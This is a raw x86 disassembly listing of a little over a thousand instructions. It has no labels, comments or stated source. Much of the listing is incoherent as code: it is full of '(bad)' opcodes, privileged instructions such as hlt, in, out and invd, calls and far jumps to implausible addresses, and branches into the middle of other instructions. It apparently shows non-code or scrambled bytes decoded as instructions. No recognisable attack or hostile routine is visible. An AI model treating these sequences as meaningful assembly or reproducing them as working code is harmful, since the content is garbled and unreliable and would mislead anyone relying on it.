  40fd7d:	mov    eax,DWORD PTR [ebp+0x3c]
  40fd80:	mov    ecx,DWORD PTR [eax]
  40fd82:	hlt    
  40fd83:	inc    ebp
  40fd84:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40fd8b:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fd91:	push   ebp
  40fd92:	mov    edi,DWORD PTR [ebx]
  40fd94:	in     al,dx
  40fd95:	jne    0x40fd58
  40fd97:	mov    eax,DWORD PTR [ebp-0x28]
  40fd9a:	add    DWORD PTR [eax],0xe8058dec
  40fda0:	clc    
  40fda1:	mov    esi,DWORD PTR [edi-0x8]
  40fda4:	add    dh,dl
  40fda6:	rol    WORD PTR [ebp-0x1],cl
  40fdaa:	mov    edx,DWORD PTR [eax+0x8]
  40fdad:	jne    0x40fd6f
  40fdaf:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40fdb6:	inc    ebp
  40fdb7:	push   esp
  40fdb8:	test   DWORD PTR [ecx+0xf],ecx
  40fdbb:	sub    edx,esp
  40fdbd:	add    eax,DWORD PTR [eax]
  40fdbf:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40fdc5:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40fdcc:	mov    eax,DWORD PTR [ecx]
  40fdce:	and    BYTE PTR [eax],al
  40fdd0:	cmp    al,0x10
  40fdd2:	add    BYTE PTR [ebp+0x66],al
  40fdd5:	inc    ecx
  40fdd7:	push   esp
  40fdd8:	add    dh,BYTE PTR [ebp+0x0]
  40fddb:	push   edx
  40fddc:	enterw 0xc1,0x4d
  40fde1:	mov    esp,DWORD PTR [esi+0x20]
  40fde4:	add    DWORD PTR [ecx-0x7b],eax
  40fde7:	add    eax,DWORD PTR [ebx]
  40fde9:	str    WORD PTR [eax+0x45]
  40fded:	lea    ecx,[ebx+0x45890801]
  40fdf3:	sbb    BYTE PTR [ebx],al
  40fdf5:	dec    ebp
  40fdf6:	cmp    al,0xf
  40fdf8:	inc    ebp
  40fdf9:	push   eax
  40fdfa:	mov    esi,DWORD PTR [ebx]
  40fdfc:	push   eax
  40fdfd:	add    eax,eax
  40fdff:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40fe06:	inc    ebp
  40fe07:	add    BYTE PTR [ecx],dh
  40fe09:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  40fe10:	(bad)  
  40fe11:	mov    ebx,eax
  40fe13:	loopne 0x40fe5a
  40fe15:	dec    ebp
  40fe16:	mov    ecx,DWORD PTR [edi]
  40fe18:	cld    
  40fe19:	push   eax
  40fe1a:	xchg   DWORD PTR [ebx],esi
  40fe1c:	add    DWORD PTR [ebx],ebp
  40fe1e:	add    BYTE PTR [ebx],ch
  40fe20:	or     BYTE PTR [ecx],bh
  40fe22:	dec    ecx
  40fe23:	loopne 0x40fe28
  40fe25:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40fe2b:	push   ebp
  40fe2c:	add    DWORD PTR [ebx+0x55100800],eax
  40fe32:	dec    ebp
  40fe33:	jmp    0x40fdbe
  40fe35:	mov    esp,DWORD PTR [eax]
  40fe37:	sbb    dl,dl
  40fe39:	inc    eax
  40fe3a:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40fe40:	add    BYTE PTR [ebx+0x74528555],cl
  40fe46:	push   ebp
  40fe47:	div    DWORD PTR [ebx]
  40fe49:	and    eax,DWORD PTR [ebx]
  40fe4b:	add    edx,DWORD PTR [edx-0x30]
  40fe4e:	jno    0x40fddb
  40fe50:	inc    DWORD PTR [eax+eiz*1]
  40fe53:	inc    ebp
  40fe54:	push   eax
  40fe55:	push   eax
  40fe56:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40fe5c:	mov    edi,esp
  40fe5e:	push   eax
  40fe5f:	inc    ebp
  40fe60:	enter  0x458b,0x8
  40fe64:	push   ecx
  40fe65:	(bad)  
  40fe66:	call   0x10b083e
  40fe6b:	pop    ss
  40fe6c:	push   ebp
  40fe6d:	mov    ecx,DWORD PTR [ebx+0x489408]
  40fe73:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40fe79:	push   ecx
  40fe7a:	jo     0x40fe64
  40fe7c:	inc    DWORD PTR [edi]
  40fe7e:	or     BYTE PTR [eax],al
  40fe80:	call   0xcc05ca
  40fe85:	fmul   QWORD PTR [ebp+0x55]
  40fe88:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fe8e:	mov    bh,0x8c
  40fe90:	adc    al,0x9b
  40fe92:	dec    esp
  40fe93:	xor    bl,BYTE PTR [eax]
  40fe95:	mov    ecx,DWORD PTR [ebp+0xc]
  40fe98:	mov    eax,DWORD PTR [ebp-0x4]
  40fe9b:	mov    esi,DWORD PTR [edi-0x3148f924]
  40fea1:	push   es
  40fea2:	retf   
  40fea3:	mov    BYTE PTR [ebp-0x30],0x3b
  40fea7:	inc    ebp
  40fea8:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  40feaf:	retf   0x83fc
  40feb2:	into   
  40feb3:	dec    ebp
  40feb4:	retf   
  40feb5:	mov    ecx,DWORD PTR [ebp-0x74]
  40feb8:	mov    eax,DWORD PTR [eax]
  40feba:	fdiv   QWORD PTR [ebx]
  40febc:	mov    bh,0x3
  40febe:	push   es
  40febf:	mov    esi,ecx
  40fec1:	sbb    cl,dl
  40fec3:	dec    ebp
  40fec4:	sar    DWORD PTR [ebx],cl
  40fec6:	push   ebp
  40fec7:	jne    0x40fed8
  40fec9:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  40fecf:	lea    ebx,[eax]
  40fed1:	call   0xf4ca8a98
  40fed6:	sbb    dh,dl
  40fed8:	add    edx,ebx
  40feda:	push   ebp
  40fedb:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  40fee1:	push   ecx
  40fee2:	mov    DWORD PTR [eax-0x30],edx
  40fee5:	test   DWORD PTR [edx],eax
  40fee7:	xadd   esp,esi
  40feea:	pop    es
  40feeb:	add    cl,dl
  40feed:	mov    eax,ecx
  40feef:	or     al,0x45
  40fef1:	(bad)  
  40fef2:	push   eax
  40fef3:	add    DWORD PTR [edx+0x0],eax
  40fef6:	add    ecx,DWORD PTR [ecx]
  40fef8:	and    dh,cl
  40fefa:	call   0xc507ca
  40feff:	add    DWORD PTR [ebp+0x0],edx
  40ff02:	mov    esp,DWORD PTR [ebp+0x18]
  40ff05:	add    BYTE PTR [eax+0x50],cl
  40ff08:	xor    eax,DWORD PTR [eax]
  40ff0a:	add    esp,DWORD PTR [esi+0x3b]
  40ff0d:	inc    ebp
  40ff0e:	je     0x40fe93
  40ff10:	push   ecx
  40ff11:	dec    BYTE PTR [ebp-0x77]
  40ff14:	add    eax,esi
  40ff16:	or     al,0x5e
  40ff18:	inc    eax
  40ff19:	add    BYTE PTR [ebx],al
  40ff1b:	data16 and BYTE PTR [ebp+0x50],al
  40ff1f:	sub    DWORD PTR [ecx],0xfffffff8
  40ff22:	add    BYTE PTR [ebp-0x75],ah
  40ff25:	add    BYTE PTR [eax],bl
  40ff27:	enter  0x894d,0x8b
  40ff2b:	int3   
  40ff2c:	loopne 0x40fef0
  40ff2e:	rol    BYTE PTR [eax],0x33
  40ff31:	lea    cx,[ebp+0xa]
  40ff35:	data16 jb 0x40ff7d
  40ff38:	add    BYTE PTR [ebx+0x44890855],cl
  40ff3e:	sbb    ah,al
  40ff40:	inc    ebp
  40ff41:	cmp    al,0xf
  40ff43:	add    BYTE PTR [edx+0x66],dl
  40ff46:	xor    ecx,DWORD PTR [eax]
  40ff48:	sub    eax,DWORD PTR [edx]
  40ff4a:	mov    eax,DWORD PTR [eax]
  40ff4c:	or     al,0x66
  40ff4e:	ror    edx,cl
  40ff50:	dec    ebp
  40ff51:	inc    ebp
  40ff52:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  40ff58:	cld    
  40ff59:	or     BYTE PTR [edi+0x4501dd],dl
  40ff5f:	ret    0xecce
  40ff62:	retf   
  40ff63:	(bad)  
  40ff64:	dec    ebp
  40ff65:	mov    al,0x8b
  40ff67:	loopne 0x40ff89
  40ff69:	cmp    ecx,DWORD PTR [edx]
  40ff6b:	inc    ebp
  40ff6c:	daa    
  40ff6d:	loopne 0x40fef6
  40ff6f:	in     al,dx
  40ff70:	add    edi,eax
  40ff72:	add    BYTE PTR [eax+0x3f52e155],bh
  40ff78:	push   ebp
  40ff79:	inc    ebp
  40ff7a:	xor    ebx,edx
  40ff7c:	add    ebp,esp
  40ff7e:	push   edx
  40ff7f:	push   bp
  40ff81:	inc    ebp
  40ff82:	(bad)  
  40ff83:	in     eax,dx
  40ff84:	push   esp
  40ff85:	(bad)  
  40ff86:	inc    edx
  40ff88:	sbb    al,0x33
  40ff8a:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  40ff91:	add    BYTE PTR [ebp+0x46],0x8b
  40ff95:	jmp    0xf98b:0x100041c8
  40ff9c:	xor    esi,DWORD PTR [edx+0x3]
  40ff9f:	mov    ecx,DWORD PTR [edi]
  40ffa1:	fmul   DWORD PTR [edx]
  40ffa3:	add    BYTE PTR [eax],al
  40ffa5:	lea    eax,[ebx-0x4700273c]
  40ffab:	add    al,0x4f
  40ffad:	pop    DWORD PTR [eax]
  40ffaf:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  40ffb5:	push   edx
  40ffb6:	inc    WORD PTR [ebp+0x8]
  40ffba:	mov    eax,0x514f4d
  40ffbf:	(bad)
  40ffc3:	add    al,al
  40ffc5:	xor    DWORD PTR [ebx-0x74baf730],eax
  40ffcb:	test   DWORD PTR [esi+0x74],esp
  40ffce:	inc    ebp
  40ffcf:	mov    DWORD PTR [eax+0xa4e08],edi
  40ffd5:	add    BYTE PTR [ecx-0x76c435bb],cl
  40ffdb:	or     dh,cl
  40ffdd:	or     eax,0x8b8d5045
  40ffe2:	inc    ebp
  40ffe3:	mov    WORD PTR [ecx+0x3b8a00],?
  40ffe9:	jne    0x41001e
  40ffeb:	mov    edi,DWORD PTR [edx+0x8f3b18]
  40fff1:	add    DWORD PTR [ebx],eax
  40fff3:	add    bh,bh
  40fff5:	adc    DWORD PTR [eax],ecx
  40fff7:	adc    DWORD PTR [ebp+0x55],edi
  40fffa:	push   es
  40fffb:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410001:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  410008:	inc    ebp
  410009:	mov    esp,edi
  41000b:	or     al,0xda
  41000d:	push   eax
  41000e:	(bad)  
  41000f:	jne    0x40ffc5
  410011:	call   0x38f900
  410016:	inc    ebp
  410017:	sar    BYTE PTR [eax],0x84
  41001a:	in     al,dx
  41001b:	add    bh,al
  41001d:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  410024:	(bad)  
  410025:	and    al,al
  410027:	fs in  eax,dx
  410029:	inc    DWORD PTR [ebp-0x7b]
  41002c:	jle    0x41003d
  41002e:	leave  
  41002f:	scas   al,BYTE PTR es:[edi]
  410030:	inc    esp
  410031:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  410038:	or     BYTE PTR [ebx-0x97717c8],0x83
  41003f:	call   DWORD PTR [edi]
  410041:	shr    ah,0x84
  410044:	xchg   DWORD PTR [eax],eax
  410046:	add    DWORD PTR [eax],eax
  410048:	add    bh,bh
  41004a:	dec    ebp
  41004b:	and    BYTE PTR [ecx-0x38],dl
  41004e:	push   eax
  41004f:	dec    DWORD PTR [ebx+0xfd885]
  410055:	mov    BYTE PTR [ebp+0x508bac00],cl
  41005b:	mov    WORD PTR [ecx+0x0],ss
  41005e:	lea    ecx,[ebx+0x108b20d8]
  410064:	mov    WORD PTR [edx],ds
  410066:	add    BYTE PTR [edi+0xff01ff],al
  41006c:	mov    ecx,DWORD PTR [ebp-0x28]
  41006f:	push   ecx
  410070:	shl    BYTE PTR [ebp+0x3a],0x8b
  410074:	inc    ebp
  410075:	in     al,0xeb
  410077:	jno    0x410004
  410079:	push   edx
  41007a:	mov    DWORD PTR [eax-0x28],edx
  41007d:	mov    eax,DWORD PTR [ebp+0x20]
  410080:	je     0x410009
  410082:	mov    eax,DWORD PTR [ecx]
  410084:	sbb    BYTE PTR [eax],al
  410086:	pop    DWORD PTR [eax]
  410088:	add    esi,eax
  41008a:	add    bl,al
  41008c:	adc    DWORD PTR [edi],esi
  41008e:	jmp    0x8bcc50e0
  410093:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  41009a:	jne    0x410027
  41009c:	mov    ecx,DWORD PTR [eax]
  41009e:	in     al,0x75
  4100a0:	pop    DWORD PTR [ecx+0x5401]
  4100a6:	push   edx
  4100a7:	inc    DWORD PTR [ebx]
  4100a9:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4100af:	add    BYTE PTR [edi+0x9],dl
  4100b2:	call   DWORD PTR [esi]
  4100b4:	and    dl,al
  4100b6:	and    bh,bh
  4100b8:	inc    edi
  4100ba:	test   eax,edx
  4100bc:	sldt   ebx
  4100bf:	xor    al,BYTE PTR [eax]
  4100c1:	pushf  
  4100c2:	(bad)  
  4100c3:	jmp    0x4100d1
  4100c5:	mov    eax,edi
  4100c7:	or     al,0x75
  4100c9:	inc    eax
  4100ca:	call   0x40f7d2
  4100cf:	mov    eax,eax
  4100d1:	loopne 0x410057
  4100d3:	inc    ebp
  4100d4:	add    BYTE PTR [ebx+0x1451c00],cl
  4100da:	mov    eax,DWORD PTR [ebp+0x20]
  4100dd:	add    edi,ecx
  4100df:	add    BYTE PTR [eax],ch
  4100e1:	cmp    edi,0x18
  4100e4:	test   DWORD PTR [ebp+0xf],esi
  4100e7:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4100ee:	jne    0x4100f2
  4100f0:	call   0xff9ffbb5
  4100f5:	leave  
  4100f6:	rcr    BYTE PTR [esp+eax*4],0x55
  4100fa:	add    ah,ch
  4100fc:	add    BYTE PTR [edi-0x48fef979],dh
  410102:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  410109:	inc    esp
  41010a:	mov    ebx,DWORD PTR [eax]
  41010c:	fcom   st(2)
  41010e:	add    BYTE PTR [edi],bl
  410110:	lea    ecx,[eax-0x18]
  410113:	(bad)  
  410114:	push   DWORD PTR [ecx]
  410116:	call   0xffb34e78
  41011b:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  41011f:	fstp   DWORD PTR [esi+ebx*8]
  410122:	push   ebp
  410123:	pop    ebp
  410124:	mov    esi,DWORD PTR [edx-0x38]
  410127:	add    DWORD PTR [eax],0x28
  41012a:	mov    edi,DWORD PTR [ebx]
  41012c:	xor    esi,DWORD PTR [edx+0x3]
  41012f:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410133:	pop    ebp
  410134:	or     al,0x4
  410136:	inc    ecx
  410137:	push   ebp
  410138:	(bad)  
  410139:	in     al,dx
  41013a:	or     ah,ch
  41013c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41013d:	xbegin 0xffc67733
  410143:	clc    
  410144:	adc    al,0x45
  410146:	div    BYTE PTR [edx]
  410148:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  41014f:	test   DWORD PTR [ebx+0x666300f8],ebx
  410155:	add    BYTE PTR [ecx+0x66],dh
  410158:	add    eax,DWORD PTR [ebp+0x52]
  41015b:	adc    eax,0xffffffa0
  41015e:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  410164:	test   DWORD PTR [eax],eax
  410166:	clc    
  410167:	data16 or al,BYTE PTR [ebp+0x45]
  41016b:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  410172:	rol    BYTE PTR [ebp+0x45],1
  410175:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  41017b:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  410181:	push   ebx
  410182:	add    BYTE PTR [eax+eax*1+0x51],dl
  410186:	jge    0x4101bb
  410188:	add    BYTE PTR [esi+0x4],dl
  41018b:	jne    0x4101f2
  41018d:	mov    edx,0x457200
  410192:	jmp    0x410156
  410194:	xor    edi,DWORD PTR [ebx]
  410196:	pop    edi
  410197:	cvtdq2ps xmm7,xmm0
  41019a:	ret    0x0
  41019d:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4101a3:	xor    ecx,DWORD PTR [edi]
  4101a5:	add    eax,DWORD PTR [ecx+0x3b]
  4101a8:	push   ebx
  4101a9:	rdpmc  
  4101ab:	out    0x8d,al
  4101ad:	add    BYTE PTR [eax],cl
  4101af:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4101b5:	ret    0x450c
  4101b8:	sbb    al,0x8b
  4101ba:	cmp    eax,esi
  4101bc:	or     cl,al
  4101be:	or     al,0xc2
  4101c0:	pop    eax
  4101c1:	inc    ebp
  4101c2:	add    ecx,DWORD PTR [edi]
  4101c4:	add    esi,DWORD PTR [ebp+0x39]
  4101c7:	invd   
  4101c9:	jge    0x4101d5
  4101cb:	mov    eax,0x478ac0
  4101d0:	cli    
  4101d1:	xor    esp,ecx
  4101d3:	mov    ebx,0x5b8ac0
  4101d8:	ret    0x33
  4101db:	mov    eax,0x833b8b
  4101e0:	sub    BYTE PTR [ebx],al
  4101e2:	inc    ebp
  4101e3:	xor    ax,di
  4101e6:	pushf  
  4101e7:	inc    bh
  4101e9:	mov    esp,esp
  4101eb:	hlt    
  4101ec:	test   DWORD PTR [ebp-0x8],esi
  4101ef:	mov    eax,DWORD PTR [ebp-0x14]
  4101f2:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4101f8:	dec    edi
  4101f9:	or     BYTE PTR [eax],al
  4101fb:	jne    0x410186
  4101fd:	mov    esi,esp
  4101ff:	call   0x77a78dc4
  410204:	inc    ebp
  410205:	mov    DWORD PTR [eax+0x9b4f0c],edi
  41020b:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410211:	add    BYTE PTR [esi+0x7d],ah
  410214:	inc    ebp
  410215:	mov    bx,WORD PTR [ebp+0x8]
  410219:	add    DWORD PTR [ebp+0x54],0x30c008b
  410220:	inc    ebp
  410221:	mov    bx,di
  410224:	lock test BYTE PTR [ecx+0x7000801],bh
  41022b:	jge    0x4101ee
  41022d:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  410233:	cli    
  410234:	xor    bl,bh
  410236:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41023c:	test   BYTE PTR [eax],cl
  41023e:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  410245:	cmp    ebp,eax
  410247:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  41024e:	test   BYTE PTR [ebp+0x1],bh
  410251:	mov    ebx,0x458a00
  410256:	xor    esi,DWORD PTR [ebx]
  410258:	add    esp,DWORD PTR [esi-0x77]
  41025b:	pop    ebp
  41025c:	loopne 0x4102c4
  41025e:	inc    ebp
  41025f:	clc    
  410260:	xor    edi,DWORD PTR [ebx]
  410262:	add    esi,DWORD PTR [edx-0x77]
  410265:	data16 fdivr QWORD PTR [ebp-0x49]
  410269:	mov    ebx,0xb78afc
  41026e:	hlt    
  41026f:	xor    edi,DWORD PTR [esi+eiz*2]
  410272:	add    BYTE PTR [ebp+0x66],bl
  410275:	data16 lock clc 
  410278:	cmp    al,0x3b
  41027a:	add    BYTE PTR [edi+0x66],dh
  41027d:	psubq  mm7,QWORD PTR [ebp+0x2]
  410281:	ltr    WORD PTR [ebp+0x66]
  410285:	add    esi,eax
  410287:	add    di,WORD PTR [ebp+0x2b]
  41028b:	data16 data16 jge 0x41030c
  41028f:	mov    ebx,0xe08a8b
  410294:	jge    0x4102c9
  410296:	data16 data16 xor al,0x5d
  41029a:	data16 data16 jne 0x410296
  41029e:	mov    edi,DWORD PTR [ebx]
  4102a0:	fdiv   QWORD PTR [edx+0x7d]
  4102a3:	data16 data16 jge 0x4102db
  4102a7:	mov    ebx,0x758a66
  4102ac:	mov    esi,0x667233
  4102b1:	pop    ebp
  4102b2:	or     BYTE PTR [esi+0x0],ah
  4102b5:	clc    
  4102b6:	mov    edi,DWORD PTR [ebx]
  4102b8:	lock ja 0x410246
  4102bb:	(bad)  
  4102bd:	jge    0x4102b6
  4102bf:	invd   
  4102c1:	pop    ebp
  4102c2:	add    BYTE PTR [ebx],al
  4102c4:	(bad)  
  4102c5:	cmp    di,WORD PTR [ebp+0xf]
  4102c9:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4102cd:	mov    bx,WORD PTR [ebp-0x10]
  4102d1:	pop    bp
  4102d3:	fbstp  TBYTE PTR [ebx]
  4102d5:	test   DWORD PTR [ebx],eax
  4102d7:	add    BYTE PTR [ebx],bh
  4102d9:	add    BYTE PTR [esi+0x7d],ah
  4102dc:	jge    0x410269
  4102de:	data16 in al,dx
  4102e0:	pop    ebp
  4102e1:	stc    
  4102e2:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4102e9:	mov    edi,ebx
  4102eb:	in     al,dx
  4102ec:	test   BYTE PTR [ebp+0x0],bh
  4102ef:	mov    eax,DWORD PTR [eax]
  4102f1:	call   0xbd3dfc81
  4102f6:	cmp    al,0x9b
  4102f8:	add    BYTE PTR [edx],dh
  4102fa:	mov    bx,di
  4102fd:	call   0x8b49808d
  410302:	add    ebp,esp
  410304:	mov    bx,di
  410307:	jnp    0x41032f
  410309:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  41030f:	mov    eax,DWORD PTR [eax]
  410311:	call   0x7c3c8e7c
  410316:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41031c:	data16 data16 fistp WORD PTR [ebp+0xe]
  410321:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  41032b:	fisttp WORD PTR [ecx-0x7401f77b]
  410331:	(bad)  
  410332:	cld    
  410333:	jne    0x410371
  410335:	xor    eax,DWORD PTR [eax]
  410337:	mov    esp,DWORD PTR [esi-0x10]
  41033a:	sti    
  41033b:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  410342:	data16 adc bl,bh
  410345:	push   ebp
  410346:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  41034d:	mov    WORD PTR [eax],es
  41034f:	fwait
  410350:	data16 xor bh,bl
  410353:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  410359:	mov    esp,DWORD PTR [esi-0x14]
  41035c:	fisttp WORD PTR [ebx-0x3748a9f2]
  410362:	or     al,0x2b
  410364:	mov    bh,0xba
  410366:	hlt    
  410367:	mov    bh,bl
  410369:	add    BYTE PTR [ecx-0x7446f3cd],cl
  41036f:	dec    esi
  410370:	or     al,0x0
  410372:	mov    edi,DWORD PTR [ebx]
  410374:	or     BYTE PTR [ebp+0x3b],dh
  410377:	mov    ecx,DWORD PTR [edi]
  410379:	fdivr  QWORD PTR [ebx-0x7499ff83]
  41037f:	xor    al,0xd8
  410381:	pop    bp
  410383:	lock xor esi,DWORD PTR [ebx]
  410386:	lea    esp,[esi+0x1f]
  410389:	icebp  
  41038a:	jb     0x410390
  41038c:	add    al,al
  41038e:	jge    0x41039c
  410390:	mov    eax,eax
  410392:	fsubr  st,st(3)
  410394:	pop    ebp
  410395:	mov    esi,DWORD PTR [ebx]
  410397:	in     al,0x8d
  410399:	rcr    DWORD PTR [edi],0xc2
  41039c:	jb     0x4103fc
  41039e:	add    cl,cl
  4103a0:	jge    0x4103ae
  4103a2:	mov    edx,DWORD PTR [ebp-0x20]
  4103a5:	in     al,dx
  4103a6:	pop    ebp
  4103a7:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4103ac:	cmp    di,WORD PTR [ebp+0x0]
  4103b0:	mov    ebp,DWORD PTR [ebx]
  4103b2:	fdivr  QWORD PTR [esi+0x668a5d]
  4103b8:	cmp    al,0x33
  4103ba:	mov    si,0x4e7d
  4103be:	mov    eax,DWORD PTR [eax]
  4103c0:	lock inc ebp
  4103c2:	mov    esi,DWORD PTR [eax]
  4103c4:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4103cb:	clc    
  4103cc:	(bad)  
  4103cd:	cmp    edi,DWORD PTR [ebx]
  4103cf:	je     0x4103e0
  4103d1:	push   ebx
  4103d2:	loopne 0x4103e3
  4103d4:	dec    ecx
  4103d6:	mov    esp,DWORD PTR [ebp-0x1c]
  4103d9:	int    0xf1
  4103db:	mov    esi,0x703084d
  4103e0:	pcmpgtd mm6,mm1
  4103e3:	add    BYTE PTR [ebp+0x66],dh
  4103e6:	jmp    0x4103b3
  4103e8:	mov    eax,DWORD PTR [ebx]
  4103ea:	lock push ebp
  4103ec:	ror    DWORD PTR [ebp-0x2972feb3],1
  4103f2:	or     bh,dl
  4103f4:	jb     0x4103f4
  4103f6:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4103fc:	loopne 0x4103fe
  4103fe:	jne    0x410402
  410400:	data16 add BYTE PTR [esi+eiz*2],dh
  410404:	mov    ecx,ebx
  410406:	data16 cmp al,0xf1
  410409:	add    BYTE PTR [esi+eiz*2],bh
  41040c:	add    bl,cl
  41040e:	retw   0xf2
  410412:	ret    0x66
  410415:	retf   
  410416:	enterw 0x4df1,0x19
  41041b:	pop    edi
  41041c:	jne    0x41039f
  41041e:	mov    esi,DWORD PTR [eax]
  410420:	call   0x77b58fc1
  410425:	xor    ebp,DWORD PTR [ebx]
  410427:	lea    esp,[esi+0x48]
  41042a:	repnz in eax,0x3b
  41042d:	add    BYTE PTR [ebp-0x37],dh
  410430:	xor    edx,DWORD PTR [ebp-0x15]
  410433:	in     al,dx
  410434:	xor    edx,DWORD PTR [esi+0x40]
  410437:	mov    DWORD PTR [edi],0x338545fc
  41043d:	clc    
  41043e:	add    esi,DWORD PTR [ecx]
  410440:	pop    edi
  410441:	pushf  
  410442:	pop    ebx
  410443:	call   0xff42040a
  410448:	mov    edi,eax
  41044a:	push   ecx
  41044b:	pop    es
  41044c:	mov    edi,DWORD PTR [eax]
  41044e:	push   esi
  41044f:	inc    esi
  410450:	add    bh,BYTE PTR [esi+0x0]
  410453:	popa   
  410454:	data16 (bad) 
  410456:	into   
  410457:	gs cmp al,0xcd
  41045a:	add    BYTE PTR [ecx+0x7ce0866],bh
  410460:	ret    0x66
  410463:	add    bh,al
  410465:	add    bh,ah
  410467:	add    BYTE PTR [ebp+0x31c3f866],al
  41046d:	cmp    al,0x9c
  41046f:	add    BYTE PTR [esi+0x66],ah
  410472:	into   
  410473:	ret    
  410474:	pop    ebp
  410475:	adc    BYTE PTR [edi+0x0],dl
  410478:	mov    bh,0x66
  41047a:	mov    edi,0xff038dc3
  41047f:	jne    0x4104d5
  410481:	lea    edx,[ecx+0x1]
  410484:	mov    ebx,0xd64ff1
  410489:	sar    DWORD PTR [ebx],1
  41048b:	test   BYTE PTR [ebp+0x36],dh
  41048e:	mov    DWORD PTR [esp+edi*8-0x76],esp
  410492:	push   edi
  410493:	xor    BYTE PTR [ebx],0x38
  410496:	mov    esi,ebx
  410498:	xor    eax,DWORD PTR [eax-0x3c73819a]
  41049e:	ss inc ebp
  4104a0:	fs pop ebx
  4104a2:	mov    ebx,0x9c3b30
  4104a7:	je     0x4104d4
  4104a9:	xor    edi,DWORD PTR [ebx+0x668a33]
  4104af:	mov    WORD PTR [ebx],?
  4104b1:	ss mov ebx,0x8b4e64
  4104b7:	pop    edi
  4104b8:	cmp    ecx,ecx
  4104ba:	jne    0x410511
  4104bc:	mov    ebp,esp
  4104be:	cld    
  4104bf:	push   esi
  4104c0:	pop    ebx
  4104c1:	inc    ebp
  4104c2:	stc    
  4104c3:	xor    BYTE PTR [ebp+0x9bef89c],al
  4104c9:	test   esi,ecx
  4104cb:	clc    
  4104cc:	test   dl,dl
  4104ce:	cmp    bh,bh
  4104d0:	fs pop si
  4104d3:	or     bl,al
  4104d5:	add    cl,BYTE PTR [ebx+0x57665100]
  4104db:	retf   0x3c45
  4104de:	xor    BYTE PTR [eax],al
  4104e0:	pushf  
  4104e1:	mov    si,0x85ca
  4104e5:	ret    0xf8
  4104e8:	pop    ebx
  4104e9:	dec    dx
  4104ec:	mov    edx,DWORD PTR [edi-0x76]
  4104ef:	push   edi
  4104f0:	add    al,0xb7
  4104f2:	xor    al,0xba
  4104f4:	cmp    al,0x8d
  4104f6:	je     0x4104f7
  4104f8:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4104fc:	lea    edi,[ebx+0x544fff]
  410502:	push   ecx
  410503:	cmp    edx,DWORD PTR [ebx+0x75]
  410506:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41050c:	add    BYTE PTR [ebx],dh
  41050e:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410514:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  41051b:	mov    ebx,0x3b3b00
  410520:	jne    0x41054d
  410522:	mov    DWORD PTR [ebx+0x728afc],edi
  410528:	xor    esi,DWORD PTR [ebx]
  41052a:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410530:	push   edi
  410531:	cmp    esp,ebp
  410533:	jne    0x410535
  410535:	sbb    DWORD PTR [eax],0x8085c3fc
  41053b:	clc    
  41053c:	inc    esi
  41053d:	pop    ebx
  41053e:	sti    
  41053f:	add    eax,0xeb8bc075
  410544:	cld    
  410545:	xor    edi,DWORD PTR ds:0xf8c3855e
  41054b:	mov    ecx,DWORD PTR [ecx+edx*2]
  41054e:	rol    DWORD PTR [ebp-0x37],0xf
  410552:	mov    DWORD PTR [eax],ecx
  410554:	inc    edi
  410555:	(bad)  
  410556:	in     eax,0xfe
  410558:	add    bh,bh
  41055a:	(bad)  
  41055b:	mov    esi,0xc38a5e
  410560:	mov    esi,DWORD PTR [ebx]
  410562:	push   ecx
  410563:	mov    edi,0xfc4ec7
  410568:	test   DWORD PTR [ebp-0x8],edx
  41056b:	xor    di,ax
